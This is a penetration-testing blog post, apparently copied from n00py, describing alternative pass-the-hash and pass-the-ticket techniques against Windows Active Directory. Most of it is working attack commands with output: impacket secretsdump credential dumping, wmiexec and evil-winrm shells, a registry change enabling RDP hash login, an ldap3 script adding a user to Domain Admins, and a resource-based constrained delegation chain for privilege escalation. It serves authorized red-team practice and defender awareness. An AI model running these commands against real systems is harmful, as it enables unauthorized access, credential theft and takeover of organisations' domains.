

##
#
https://www.n00py.io/2020/12/alternative-ways-to-pass-the-hash-pth/
#
##

Alternative ways to Pass the Hash (PtH)
 December 13, 2020 n00py  PentestingPost Exploitation  0 Comment
Do you remember the first time you passed the hash?  It probably went a little something like this:

1
2
3
4
5
6
msf > use exploit/windows/smb/psexec
msf exploit(psexec) > set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c
SMBPass => e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c
msf exploit(psexec) > exploit
[*] Sending stage (719360 bytes)
[*] Meterpreter session 1 opened (192.168.57.133:443 -> 192.168.57.131:1045)
If you are unfamiliar, that is the Metasploit PSexec module being used.

Well, nowadays we don’t really do that anymore.  You probably pass the hash something like this:

1
2
3
cme smb 10.0.0.20 -u user -H BD1C6503987F8FF006296118F359FA79  -d domain.local
SMB         10.0.0.20     445    PC01      [*] Windows Server 2012 R2 Standard 9600 x64 (name:PC01) (domain:domain.local) (signing:False) (SMBv1:True)
SMB         10.0.0.20     445    PC01       [+] domain.local\user BD1C6503987F8FF006296118F359FA79 (Pwn3d!)
That is CrackMapExec being used to pass the hash.  As you may already know, CrackMapExec under the hood is mostly impacket. The default execution method is using wmiexec.py, which can be ran standalone with impacket using the following syntax:

1
2
3
4
5
wmiexec.py domain.local/user@10.0.0.20 -hashes aad3b435b51404eeaad3b435b51404ee:BD1C6503987F8FF006296118F359FA79
[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>
You will find that basically all of impacket’s example scripts allow you to pass the hash.

What I want to talk about next is ways to pass the hash that might be new to you.

WinRM
What: The short of it is that Windows Remote Management (WinRM) is another way to remotely manage computers aside from WMI and other similar protocols and uses a different set of ports.  WinRM uses either port 5985 (HTTP) or 5986 (HTTPS).

Why: Sometimes you will find that SMB is not open, or that some endpoint protection is preventing you from using your standard toolset.

How: This can be done using a variety of tools including CrackMapExec, but right now I want to focus on evil-winrm as it contains a lot of other features. Passing the hash with evil-winrm is easy, and it looks like so:

1
2
3
4
5
6
7
ruby evil-winrm.rb -i 10.0.0.20 -u user -H BD1C6503987F8FF006296118F359FA79
 
Evil-WinRM shell v2.3
 
Info: Establishing connection to remote endpoint
 
*Evil-WinRM* PS C:\Users\user\Documents>
Resources:

https://pentestlab.blog/2018/05/15/lateral-movement-winrm/
https://bohops.com/2020/05/12/ws-management-com-another-approach-for-winrm-lateral-movement/

RDP
What: Remote desktop is a program or an operating system feature that allows a user to connect to a computer in another location, see that computer’s desktop and interact with it as if it were local.

Why: Often times during a penetration test you may want to access software installed on a user’s system that is only available through a graphic interface.  This may be a password manager that can be exported easily via the GUI, or other software that can perform actions that would be impossible/burdensome to use otherwise.  You may want to pass an NT hash of a user who couldn’t be cracked and take over their session.

How: You can pass the hash using xfreerdp.  There is one important caveat however, and that is that this is only possible when the system has Restricted Admin Mode enabled.  If this is not enabled and you try to PTH, you will get an error stating that “Account Restrictions are preventing this user from signing in.”  Restricted Admin Mode is disabled by default.  The good news is, if you have any level of admin access to the system and access to SMB/WinRM/etc, you can enable this feature remotely.

1
2
3
4
5
cme smb 10.0.0.200 -u Administrator -H 8846F7EAEE8FB117AD06BDD830B7586C -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
SMB 10.0.0.200 445 DESKTOP [*] Windows 10.0 Build 18362 x64 (name:DESKTOP) (domain:DESKTOP) (signing:False) (SMBv1:False)
SMB 10.0.0.200 445 DESKTOP [+] DESKTOP\Administrator 8846F7EAEE8FB117AD06BDD830B7586C (Pwn3d!)
SMB 10.0.0.200 445 DESKTOP [+] Executed command
SMB 10.0.0.200 445 DESKTOP The operation completed successfully.
Once the registry key is set, you can then pass the hash with xfreerdp:

1
xfreerdp /v:192.168.2.200 /u:Administrator /pth:8846F7EAEE8FB117AD06BDD830B7586C
Resources:

https://www.kali.org/penetration-testing/passing-hash-remote-desktop/
https://shellz.club/pass-the-hash-with-rdp-in-2019/
https://labs.f-secure.com/blog/undisable/

smbclient
What: smbclient is an FTP-like client to interact with SMB/CIFS resources.

Why: Often times you may not have administrative access to a system, despite having recovered valid hashes.  Consider the following scenario: You compromised a single host and dumped hashes.  One of the hashes belongs to the head of Finance.  They do not have administrative access over infrastructure, but have access to troves of confidential data on the file server.
How: smbclient has a –pw-nt-hash flag that you can use to pass an NT Hash.

1
2
3
smbclient //10.0.0.30/Finance -U user --pw-nt-hash BD1C6503987F8FF006296118F359FA79 -W domain.local
Try "help" to get a list of possible commands.
smb: \>
LDAP
What: Active Directory is the Windows implementation of a general-purpose directory service, which uses LDAP as its primary access protocol.

Why: Often times I find the best Active Directory attack chains often involve exploiting ACLs.  Consider a common penetration testing scenario: You’ve gained access to a NT hash of a user in an IT admin group that has admin access over an exchange server.  You do not have admin access over domain controllers.  Exchange servers are a member of the Exchange Trusted Subsystem group, which is a member of Exchange Windows Permissions group. This group has WriteDACL access over the domain.  It’s also important to know that computer accounts have usernames and passwords, and that these passwords are effectively uncrackable, which is why passing the hash is extremely useful.

How:
First, recover the NT hash for the Exchange server.

1
2
3
4
5
6
7
8
secretsdump.py ituser@10.0.0.40 -hashes aad3b435b51404eeaad3b435b51404ee:BD1C6503987F8FF006296118F359FA79
 
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
DOMAIN\EXCHANGE$:aes256-cts-hmac-sha1-96:fbc8df96a7709ec33edc50d2d9394d8e28c6bc65697f9bdfaf78009850cfa69d
DOMAIN\EXCHANGE$:aes128-cts-hmac-sha1-96:fe0acc236a82bd74fdcaa593f51481f2
DOMAIN\EXCHANGE$:des-cbc-md5:cd4308d6f285fc82
DOMAIN\EXCHANGE$:aad3b435b51404eeaad3b435b51404ee:6216d3268ba7634e92313c8b60293248:::
Once you have the NT hash for the exchange server, you can authenticate to a domain controller using ldap3, and authenticate by passing the hash. From here you can do a lot, but a simple attack involves adding a user you control to the Domain Admins group. In this example you may of course also use the Exchange account to DCsync with secretsdump.py.  In the case of compromising the NT hash of a member of the Account Operators group, you would not be able to DCsync however, you could use this method to add users to certain groups to expand access.

1
2
3
4
5
6
7
8
9
10
11
12
13
python3
>>> import ldap3
>>> user = 'DOMAIN\\EXCHANGE$'
>>> password = 'aad3b435b51404eeaad3b435b51404ee:6216d3268ba7634e92313c8b60293248'
>>> server = ldap3.Server('DOMAIN.LOCAL')
from ldap3 import Server, Connection, SIMPLE, SYNC, ALL, SASL, NTLM
connection = ldap3.Connection(server, user=user, password=password, authentication=NTLM)
>>> connection.bind()
>>> from ldap3.extend.microsoft.addMembersToGroups import ad_add_members_to_groups as addUsersInGroups
>>> user_dn = 'CN=IT User,OU=Standard Accounts,DC=domain,DC=local'
>>> group_dn = 'CN=Domain Admins,CN=Users,DC=domain,DC=local'
>>> addUsersInGroups(connection, user_dn, group_dn)
True
Resources:

https://pentestlab.blog/2019/09/12/microsoft-exchange-acl/

Pass the Ticket
What: Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account’s password.

Why: It may not be possible to authenticate with NTLM, and only Kerberos authentication is allowed.  I won’t even attempt to explain how Kerberos works (I don’t quite get it honestly) but it can be very useful to understand how to use it in attacks.

How: The normal way to create a Kerberos ticket on Linux is by using kinit with the username, domain, and password.  If you don’t have the password, this is a problem.  Fortunately, impacket has a tool that allows you to use an NT Hash to acquire a valid Ticket Granting Ticket (TGT) from a domain controller.  Unfortunately however, Linux distros don’t typically have Kerberos tools installed on them and you will need to set them up.

Install the kerberos package
Configure the AD realm
Get DNS working properly
Sync time
To create a Kerberos TGT using an NT hash, run a command like below:

1
2
3
4
5
python3 getTGT.py -hashes aad3b435b51404eeaad3b435b51404ee:B65039D1C0359FA797F88FF06296118F domain.local/user
 
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
 
[*] Saving ticket in user.ccache
You will want to copy the ticket to /tmp/krb5cc_0, as a lot of tools look for it in that location.  You also want to set the KRB5CCNAME environment variable to the ticket location, as some tools use that to find the ticket location.

1
2
cp user.ccache /tmp/krb5cc_0
export KRB5CCNAME=/tmp/krb5cc_0
You can validate the ticket using klist.

1
2
3
4
5
klist
Credentials cache: FILE:/tmp/krb5cc_0
Principal: user@domain.local
 
Issued                Expires               Principal
Now that you have a ticket you can use it with all of the impacket tools as an alternative to providing a password or NT hash.  This will prove to be very useful in certain situations as you will see next.  Do note that whenever using Kerberos authentication you will want to use DNS names of targets instead of IP addresses.

Resources:

https://troopers.de/downloads/troopers19/TROOPERS19_AD_Fun_With_LDAP.pdf

Mount
What: On Linux a Windows share can be mounted on a particular mount point in the local directory tree using the cifs mount type within the mount tool.

Why: While we can pass the hash using smbclient, its FTP-like interface can be limiting.  It’s often much more useful to mount a share, that way you can interact with it via the Linux command line or via a GUI file explorer. For added user experience, you can even expose this mount point with SSHFS, so you can explore the share from the comfort of your local Windows or Mac file explorer.

How: When mounting a share you cannot pass the hash, but you can connect with a Kerberos ticket (Which you can get by passing the hash!). Use a command similar to below to mount a share.  If it fails wit the error “No such file or directory” It often means that your ticket isn’t where it expected it to be or the permissions do not allow mount to see it.

1
sudo mount -t cifs -o sec=krb5,vers=3.0 '//SERVER.DOMAIN.LOCAL/SHARE' /mnt/share
SSH
What: The SSH protocol (also referred to as Secure Shell) is a method for secure remote login from one computer to another.

Why: SSH is the standard way to log onto UNIX and Linux systems.  All of the exec methods for Windows are unavailable.  Typically the only real way to remotely access these systems is via this protocol.  In larger organizations, I’ve often found that the Linux systems are joined to Active Directory.  If you have a lost of domain groups, search them to see if there are any with unix/linux in the name.  This a good sign that UNIX/Linux systems may be domain joined.

How: You cannot pass the hash to SSH, but you can connect with a Kerberos ticket (Which you can get by passing the hash!). First, try connecting using SSH and enable verbose messages.

1
2
3
4
5
ssh -o GSSAPIAuthentication=yes user@domain.local -vv
debug1: Authentications that can continue: publickey,gssapi-keyex,gssapi-with-mic,password
debug1: Next authentication method: gssapi-with-mic
debug1: Unspecified GSS failure.  Minor code may provide more information
No Kerberos credentials available (default cache: FILE:/tmp/krb5cc_1045)
Likely you will see that it is expecting the krb5 ticket somewhere else (depends on your UID) so move your ticket there instead.

1
cp user.ccache /tmp/krb5cc_1045
Once you have your ticket in the right spot, try to connect again.  If it doesn’t work, also consider using -l to specify the username.

1
2
3
ssh -o GSSAPIAuthentication=yes user@domain.local
 
[user@computer ~]$
Resource Based Constrained Delegation (RBCD)
What: If you have write privileges (WriteDACL, GenericWrite, GenericAll, etc) over a computer object, it is possible to gain elevated command execution on it.  This is not a new way to pass the hash beyond what is previously mentioned, but this attack chain incorporates multiple PTH techniques such as PTH via SMB, PTH to LDAP, PTH to get a kerberos ticket, and finally pass the ticket.

In this example we are assuming one computer object has write access over another computer object.

Why: Often times I find that there are no simple attack paths in an environment, and Active Directory privilege escalation requires exploiting ACL based attacks.

How: First, pass the hash of a user with administrative access to the first computer to recover that computers NT hash.

1
2
3
4
5
6
7
8
secretsdump.py ituser@PC01.domain.local -hashes aad3b435b51404eeaad3b435b51404ee:BD1C6503987F8FF006296118F359FA79
 
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
DOMAIN\$:aes256-cts-hmac-sha1-96:fbc8df96a7709ec33edc50d2d9394d8e28c6bc65697f9bdfaf78009850cfa69d
DOMAIN\PC01$:aes128-cts-hmac-sha1-96:fe0acc236a82bd74fdcaa593f51481f2
DOMAIN\PC01$:des-cbc-md5:cd4308d6f285fc82
DOMAIN\PC01$:aad3b435b51404eeaad3b435b51404ee:6216d3268ba7634e92313c8b60293248:::
Second, use the rbcd_permissions script to pass the hash of the computer account to the domain controller via LDAP to update the msDS-AllowedToActOnBehalfOfOtherIdentity property for the second computer.  This will allow the first computer to impersonate any domain user on that system.

1
2
python3 rbcd.py -u PC01$ -H aad3b435b51404eeaad3b435b51404ee:6216d3268ba7634e92313c8b60293248 -t 'CN=PC02,CN=Computers,DC=domain,DC=local' -d domain.local -c 'CN=PC01,CN=Computers,DC=domain,DC=local'  -l DC1.domain.local
Successfully added permissions!
Use the getST.py script from impacket to create a service ticket for an administrative user on the second computer, using the hash of the first computer.

1
2
3
4
5
6
getST.py -spn cifs/PC02 -hashes aad3b435b51404eeaad3b435b51404ee:6216d3268ba7634e92313c8b60293248 -impersonate DA domain.local/PC01\$ 
[*] Getting TGT for user
[*] Impersonating DA
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in DA.ccache
Once the ticket is created, pass the ticket to the second computer to gain administrative access over it.  Dump hashes, pop a shell, or do whatever you need to do on that system.

1
2
3
4
5
secretsdump.py -k PC02.domain.local
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x61cfb90260afec6e8c031f997d1df4bb
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Resources:

https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution
https://www.thehacker.recipes/active-directory-domain-services/movement/abusing-kerberos/kerberos-delegations#resource-based-constrained-delegations-rbcd

